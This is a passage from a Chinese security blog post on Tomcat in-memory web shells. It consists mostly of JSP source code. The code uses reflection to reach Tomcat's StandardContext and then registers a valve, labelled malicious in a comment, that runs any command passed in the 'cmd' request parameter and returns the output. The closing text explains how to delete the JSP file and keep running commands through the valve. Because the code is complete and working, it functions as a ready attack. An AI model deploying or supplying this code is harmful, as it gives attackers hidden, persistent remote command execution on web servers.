&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getStandardContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Thread[] threads = (Thread[]) <span class="keyword">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ((thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="string">&quot;http&quot;</span>))) &#123;</span><br><span class="line">                    Object target = <span class="keyword">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    HashMap children;</span><br><span class="line">                    Object jioEndPoint = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        jioEndPoint = getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">                    <span class="keyword">if</span> (jioEndPoint == <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">try</span>&#123;</span><br><span class="line">                            jioEndPoint = getField(target, <span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (Exception e)&#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    Object service = getField(getField(getField(getField(getField(jioEndPoint, <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;proto&quot;</span>), <span class="string">&quot;adapter&quot;</span>), <span class="string">&quot;connector&quot;</span>), <span class="string">&quot;service&quot;</span>);</span><br><span class="line">                    StandardEngine engine = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        engine = (StandardEngine) getField(service, <span class="string">&quot;container&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">                    <span class="keyword">if</span> (engine == <span class="keyword">null</span>)&#123;</span><br><span class="line">                        engine = (StandardEngine) getField(service, <span class="string">&quot;engine&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    children = (HashMap) getField(engine, <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                    StandardHost standardHost = (StandardHost) children.get(<span class="keyword">this</span>.serverName);</span><br><span class="line"></span><br><span class="line">                    children = (HashMap) getField(standardHost, <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                    Iterator iterator = children.keySet().iterator();</span><br><span class="line">                    <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">                        String contextKey = (String) iterator.next();</span><br><span class="line">                        <span class="keyword">if</span> (!(<span class="keyword">this</span>.uri.startsWith(contextKey)))&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                        StandardContext standardContext = (StandardContext) children.get(contextKey);</span><br><span class="line">                        <span class="keyword">this</span>.standardContext = standardContext;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> StandardContext <span class="title">getSTC</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.standardContext;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//获取StandardContext对象</span></span><br><span class="line">    Tomcat6789 a = <span class="keyword">new</span> Tomcat6789();</span><br><span class="line">    StandardContext standardContext = a.getSTC();</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//创建恶意valve</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyValve</span> <span class="keyword">implements</span> <span class="title">Valve</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> Valve next;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Valve <span class="title">getNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNext</span><span class="params">(Valve valve)</span> </span>&#123;</span><br><span class="line">            next = valve;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">backgroundProcess</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            HttpServletRequest req = request;</span><br><span class="line">            String cmd = req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                String output = s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                PrintWriter out = response.getWriter();</span><br><span class="line">                out.println(output);</span><br><span class="line">                out.flush();</span><br><span class="line">                out.close();</span><br><span class="line">            &#125;</span><br><span class="line">            getNext().invoke(request, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAsyncSupported</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取Pineline对象通过addValve增加恶意valve</span></span><br><span class="line">    standardContext.getPipeline().addValve(<span class="keyword">new</span> MyValve());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问注入valve内存马的jsp文件，然后删除jsp文件，访问任意路由，添加cmd参数执行命令</p>
<p><img src="image-20220228230314314.png" alt="image-20220228230314314"></p>

            


        </div>
    </div>
    <div id="post-footer" class="post-footer main-content-wrap">
        
            <div class="post-footer-tags">
                <span class="text-color-light text-small">标签</span><br/>
                
    <a class="tag tag--primary tag--small t-none-link" href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag">java安全</a>

            </div>
        
        
            <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    <a
                        class="post-action-btn btn btn--disabled"
                        aria-hidden="true"
                    >
                        
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/2022/01/09/20220109/"
                    data-tooltip="Shiro反序列化-550"
                    aria-label="下一篇: Shiro反序列化-550"
                >
                    
                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Diesen Beitrag teilen"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/01/15/20220115/"
                    title="分享到 Twitter"
                    aria-label="分享到 Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/01/15/20220115/"
                    title="分享到 Google+"
                    aria-label="分享到 Google+"
                >
                    <i class="fab fa-google-plus" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/01/15/20220115/&amp;title=Tomcat内存马"
                    title="分享到 QQ"
                    aria-label="分享到 QQ"
                >
                    <i class="fab fa-qq" aria-hidden="true"></i>
                </a>
            </li>
        
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


        
        
    </div>
</article>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2022 self_209. All Rights Reserved.
    </span>
</footer>

            </div>
            
                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
                    <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    <a
                        class="post-action-btn btn btn--disabled"
                        aria-hidden="true"
                    >
                        
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/2022/01/09/20220109/"
                    data-tooltip="Shiro反序列化-550"
                    aria-label="下一篇: Shiro反序列化-550"
                >
                    
                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Diesen Beitrag teilen"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/01/15/20220115/"
                    title="分享到 Twitter"
                    aria-label="分享到 Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/01/15/20220115/"
                    title="分享到 Google+"
                    aria-label="分享到 Google+"
                >
                    <i class="fab fa-google-plus" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/01/15/20220115/&amp;title=Tomcat内存马"
                    title="分享到 QQ"
                    aria-label="分享到 QQ"
                >
                    <i class="fab fa-qq" aria-hidden="true"></i>
                </a>
            </li>
        
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


                </div>
                
    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
        <i id="btn-close-shareoptions" class="fa fa-times"></i>
        <ul class="share-options">
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/01/15/20220115/"
                        aria-label="分享到 Twitter"
                    >
                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://plus.google.com/share?url=https://self209.github.io/2022/01/15/20220115/"
                        aria-label="分享到 Google+"
                    >
                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/01/15/20220115/&amp;title=Tomcat内存马"
                        aria-label="分享到 QQ"
                    >
                        <i class="fab fa-qq" aria-hidden="true"></i><span>分享到 QQ</span>
                    </a>
                </li>
            
        </ul>
    </div>


            
        </div>
        


<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-times"></i>
        </div>
        
            <h4 id="about-card-name">self_209</h4>
        
            <div id="about-card-bio"><p>author.bio</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>author.job</p>

            </div>
        
        
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->

<script src="/assets/js/script-xim376viwh5lr12gw0yeibdthi5jv6dbtso7hirh0xa2nvwxpntwvib0dgwh.min.js"></script>

<!--SCRIPTS END-->





    </body>
</html>
